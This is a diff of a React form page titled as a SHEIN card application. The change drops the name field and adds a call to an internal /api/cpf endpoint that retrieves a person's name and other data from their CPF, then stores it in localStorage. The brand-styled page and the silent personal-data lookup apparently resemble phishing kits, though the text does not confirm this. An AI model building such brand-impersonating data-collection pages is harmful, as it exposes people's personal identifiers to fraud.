@@ -8,10 +8,8 @@ import { usePageTracking, useTracking } from "@/hooks/use-tracking"
 
 // Função para formatar CPF
 const formatCPF = (value: string) => {
-  // Remove tudo que não é número
   const numbers = value.replace(/\D/g, "")
 
-  // Aplica a máscara 000.000.000-00
   if (numbers.length <= 3) {
     return numbers
   } else if (numbers.length <= 6) {
@@ -25,20 +23,16 @@ const formatCPF = (value: string) => {
 
 // Função para validar CPF
 const validateCPF = (cpf: string) => {
-  // Remove formatação
   const numbers = cpf.replace(/\D/g, "")
 
-  // Verifica se tem 11 dígitos
   if (numbers.length !== 11) {
     return false
   }
 
-  // Verifica se todos os dígitos são iguais
   if (/^(\d)\1{10}$/.test(numbers)) {
     return false
   }
 
-  // Validação do primeiro dígito verificador
   let sum = 0
   for (let i = 0; i < 9; i++) {
     sum += Number.parseInt(numbers[i]) * (10 - i)
@@ -50,7 +44,6 @@ const validateCPF = (cpf: string) => {
     return false
   }
 
-  // Validação do segundo dígito verificador
   sum = 0
   for (let i = 0; i < 10; i++) {
     sum += Number.parseInt(numbers[i]) * (11 - i)
@@ -69,17 +62,20 @@ export default function FormPage() {
   const router = useRouter()
   const { trackFormSubmit } = useTracking()
 
-  // Rastreia a página do formulário
   usePageTracking("form")
+
   const [formData, setFormData] = useState({
-    name: "",
     cpf: "",
     email: "",
   })
 
   const [errors, setErrors] = useState({
     cpf: "",
+    email: "",
+    api: "",
   })
+
+  const [isLoading, setIsLoading] = useState(false)
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { id, value } = e.target
@@ -91,7 +87,6 @@ export default function FormPage() {
         [id]: formattedCpf,
       }))
 
-      // Validação em tempo real
       const numbers = formattedCpf.replace(/\D/g, "")
       if (numbers.length === 11) {
         if (validateCPF(formattedCpf)) {
@@ -108,50 +103,103 @@ export default function FormPage() {
         [id]: value,
       }))
     }
+
+    setErrors((prev) => ({ ...prev, [id]: "", api: "" }))
   }
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    setIsLoading(true)
+    setErrors({ cpf: "", email: "", api: "" })
 
-    // Validação final do CPF
-    if (!validateCPF(formData.cpf)) {
-      setErrors((prev) => ({ ...prev, cpf: "CPF inválido" }))
+    try {
+      // Validação do CPF
+      if (!validateCPF(formData.cpf)) {
+        setErrors((prev) => ({ ...prev, cpf: "CPF inválido" }))
+        trackFormSubmit("card_application", false)
+        setIsLoading(false)
+        return
+      }
+
+      // Validação do email
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+      if (!emailRegex.test(formData.email)) {
+        setErrors((prev) => ({ ...prev, email: "Email inválido" }))
+        trackFormSubmit("card_application", false)
+        setIsLoading(false)
+        return
+      }
+
+      console.log("Consultando CPF:", formData.cpf)
+
+      // Consulta via API interna
+      const response = await fetch("/api/cpf", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          cpf: formData.cpf,
+        }),
+      })
+
+      const result = await response.json()
+      console.log("Resultado da consulta:", result)
+
+      if (!response.ok) {
+        throw new Error(result.error || `Erro na consulta: ${response.status}`)
+      }
+
+      if (!result.success || !result.data) {
+        throw new Error("Dados não encontrados para este CPF")
+      }
+
+      const cpfData = result.data
+      console.log("Dados do CPF:", cpfData)
+
+      // Verifica se tem nome
+      if (!cpfData.nome) {
+        throw new Error("Nome não encontrado para este CPF")
+      }
+
+      // Salva os dados no localStorage
+      localStorage.setItem("cpfConsultaData", JSON.stringify(cpfData))
+      localStorage.setItem("userEmail", formData.email)
+      localStorage.setItem("userCpf", formData.cpf)
+      localStorage.setItem("cardholderName", cpfData.nome)
+
+      trackFormSubmit("card_application", true)
+      router.push("/form/success")
+    } catch (error) {
+      console.error("Erro na consulta:", error)
+
+      let errorMessage = "Erro ao consultar CPF: "
+
+      if (error.message.includes("não encontrado")) {
+        errorMessage += "CPF não encontrado na base de dados."
+      } else if (error.message.includes("inválido")) {
+        errorMessage += "CPF inválido."
+      } else {
+        errorMessage += error.message
+      }
+
+      setErrors((prev) => ({
+        ...prev,
+        api: errorMessage,
+      }))
       trackFormSubmit("card_application", false)
-      return
+    } finally {
+      setIsLoading(false)
     }
-
-    // Rastreia o sucesso do formulário
-    trackFormSubmit("card_application", true)
-
-    // Navigate to success page with form data as URL parameters
-    router.push(
-      `/form/success?name=${encodeURIComponent(formData.name)}&cpf=${encodeURIComponent(formData.cpf)}&email=${encodeURIComponent(formData.email)}`,
-    )
   }
 
   return (
     <div className="min-h-full bg-gray-50 flex flex-col">
-      {/* Form Content */}
       <div className="flex-1 flex items-center justify-center p-4 py-8">
         <div className="bg-white rounded-lg shadow-md p-6 w-full max-w-md">
           <h1 className="text-xl font-bold mb-6 text-center">Solicite seu cartão SHEIN</h1>
 
           <form className="space-y-4" onSubmit={handleSubmit}>
-            <div>
-              <label htmlFor="name" className="block text-sm font-medium mb-2">
-                Nome completo
-              </label>
-              <input
-                type="text"
-                id="name"
-                value={formData.name}
-                onChange={handleChange}
-                className="w-full p-3 border rounded-md text-base focus:ring-2 focus:ring-black focus:border-transparent"
-                placeholder="Digite seu nome completo"
-                required
-              />
-            </div>
-
             <div>
               <label htmlFor="cpf" className="block text-sm font-medium mb-2">
                 CPF
@@ -167,6 +215,7 @@ export default function FormPage() {
                 placeholder="000.000.000-00"
                 maxLength={14}
                 required
+                disabled={isLoading}
               />
               {errors.cpf && <p className="text-red-500 text-xs mt-1">{errors.cpf}</p>}
             </div>
@@ -180,18 +229,36 @@ export default function FormPage() {
                 id="email"
                 value={formData.email}
                 onChange={handleChange}
-                className="w-full p-3 border rounded-md text-base focus:ring-2 focus:ring-black focus:border-transparent"
+                className={`w-full p-3 border rounded-md text-base focus:ring-2 focus:ring-black focus:border-transparent ${
+                  errors.email ? "border-red-500 focus:ring-red-500" : ""
+                }`}
                 placeholder="seu@email.com"
                 required
+                disabled={isLoading}
               />
+              {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
             </div>
+
+            {errors.api && (
+              <div className="bg-red-50 border border-red-200 rounded-md p-3">
+                <p className="text-red-600 text-sm">{errors.api}</p>
+              </div>
+            )}
 
             <div className="pt-4">
               <button
                 type="submit"
-                className="w-full bg-black hover:bg-black/80 text-white font-bold py-3 px-4 rounded-md transition text-base"
+                disabled={isLoading}
+                className="w-full bg-black hover:bg-black/80 text-white font-bold py-3 px-4 rounded-md transition text-base disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
               >
-                SOLICITAR CARTÃO
+                {isLoading ? (
+                  <>
+                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
+                    Consultando CPF...
+                  </>
+                ) : (
+                  "SOLICITAR CARTÃO"
+                )}
               </button>
             </div>
 
